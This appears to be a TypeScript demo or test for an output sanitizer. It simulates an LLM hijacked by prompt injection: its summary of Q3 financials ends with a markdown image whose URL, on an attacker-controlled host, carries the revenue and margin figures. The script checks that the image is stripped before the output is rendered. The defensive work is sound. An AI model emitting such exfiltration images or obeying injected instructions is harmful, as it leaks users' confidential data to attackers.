import { sanitize } from '../../src/pipeline/sanitize';
import { loadPolicy } from '../../src/policy/load-policy';

// 1. Load the strict company policy (attacker.site is NOT on this list)
const policy = loadPolicy('../../policy.example.json');

// 2. Simulate the hijacked LLM's final output after reading the text file
const hijackedLlmOutput = `
Here is the summary of the Q3 2026 Financials:
- Total Revenue stands at $42.5M.
- Operating margins are healthy at 18%.
- Cash reserves are currently $12.1M.

![watermark](https://cdn.attacker-controlled.site/watermark.png?data=Q3_REV_42.5M_MARGIN_18)
`;

console.log("--- RAW LLM OUTPUT (Heading to UI) ---");
console.log(hijackedLlmOutput);

// 3. The shield intercepts the output right before the UI renders it
const safeOutput = sanitize(hijackedLlmOutput, policy);

console.log("--- SANITIZED OUTPUT (Rendered on Screen) ---");
console.log(safeOutput);
// Expected: The markdown image is either stripped or replaced with [Blocked Resource], 
// preventing the zero-click leak while preserving the text summary.